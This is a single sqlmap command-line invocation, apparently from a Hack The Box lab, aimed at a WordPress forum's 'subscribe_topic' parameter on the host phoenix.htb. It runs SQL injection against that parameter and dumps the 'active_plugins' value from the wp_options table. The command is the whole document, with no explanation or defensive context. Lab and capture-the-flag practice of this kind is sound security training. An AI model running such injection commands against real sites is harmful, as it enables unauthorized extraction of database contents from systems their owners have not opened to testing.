sqlmap  -u "https://phoenix.htb/forum/?subscribe_topic=1" \
        -p "subscribe_topic" -D wordpress -T wp_options -C option_value \
        --batch --dump --where="option_name='active_plugins'"
